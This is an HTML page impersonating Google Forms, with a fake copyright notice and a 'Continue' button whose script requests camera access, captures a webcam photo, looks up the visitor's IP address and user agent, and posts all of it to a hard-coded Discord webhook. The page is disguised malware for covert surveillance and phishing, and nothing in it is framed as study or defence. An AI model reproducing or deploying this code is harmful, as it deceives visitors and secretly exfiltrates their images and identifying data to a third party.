<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Forms</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
            text-align: center;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .button {
            background-color: #007bff;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        .button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Google Forms</h1>
        <p>Google Forms 2024 LLC Â©</p>
        <button class="button" onclick="takePhotoAndSend()">Continue</button>
    </div>

    <script>
        async function takePhotoAndSend() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const videoElement = document.createElement('video');
                videoElement.srcObject = stream;
                videoElement.play();

                videoElement.onloadedmetadata = async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = videoElement.videoWidth;
                    canvas.height = videoElement.videoHeight;
                    const context = canvas.getContext('2d');
                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg');

                    sendPhotoToDiscord(imageData);

                    stream.getTracks().forEach(track => track.stop());
                };
            } catch (error) {
                console.error('Error:', error);
                alert('Grant the permissions.');
            }
        }

        function sendPhotoToDiscord(imageData) {
            var userAgent = navigator.userAgent;

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ipAddress = data.ip;

                    var payload = {
                        content: 'User IP Address: ' + ipAddress + '\nUser Agent: ' + userAgent,
                        files: [imageData]
                    };

                    fetch('https://discord.com/api/webhooks/1232343689821683764/2R_ybvehx5awP_cEYBfAqvrLdvq7T708toeOvOiFbuQLmxZWw29MKTCoSt-YjB-HN-7', {
                        method: 'POST',
                        body: JSON.stringify(payload)
                    })
                    .then(response => {
                        if (response.ok) {
                            alert('Sending U to Main page..');
                        } else {
                            alert('Hmm error');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('An error occurred. Please try again later.');
                    });
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Failed to fetch IP address. Please try again later.');
                });
        }
    </script>
</body>
</html>
